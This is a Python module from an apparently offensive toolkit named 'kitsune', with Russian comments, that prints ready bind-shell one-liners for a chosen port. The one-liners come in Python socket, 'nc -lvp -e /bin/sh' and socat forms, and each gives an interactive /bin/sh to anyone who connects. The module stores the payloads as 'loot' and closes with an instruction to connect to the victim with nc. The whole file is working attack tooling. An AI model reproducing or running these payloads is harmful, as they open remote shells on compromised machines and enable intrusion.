"""payloads/bind_shell — генератор bind-payload (ждём подключение на жертве)."""

from kitsune import db
from kitsune.framework import Module


class Module(Module):
    meta = {
        "name": "payloads/bind_shell",
        "author": "kitsune",
        "description": "Print ready bind shell one-liners (victim listens, you connect)",
        "options": {
            "bport": {"default": "5000", "required": True, "desc": "port to bind on victim"},
            "type":  {"default": "python", "required": False, "desc": "python|nc|socat"},
        },
    }

    def run(self):
        port = int(self.bport)
        snippets = {
            "python": ("python3 -c 'import socket,subprocess,os;"
                       f"s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                       f"s.bind((\"0.0.0.0\",{port}));s.listen(1);c,_=s.accept();"
                       "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
                       "subprocess.call([\"/bin/sh\",\"-i\"])'"),
            "nc":     f"nc -lvp {port} -e /bin/sh",
            "socat":  f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'/bin/sh'",
        }
        self.ok(f"bind payload for 0.0.0.0:{port}")
        rows = []
        for label, cmd in snippets.items():
            rows.append((label, cmd[:58] + "..." if len(cmd) > 58 else cmd))
            db.add_loot("payload", f"bind:{port}", f"[{label}] {cmd}")
        self.table(("Type", "Command"), rows)

        if self.type in snippets:
            self.ok(f"best match ({self.type}):\n        {snippets[self.type]}")
        self.warn("затем подключайтесь целиком: nc victim-ip <port>")
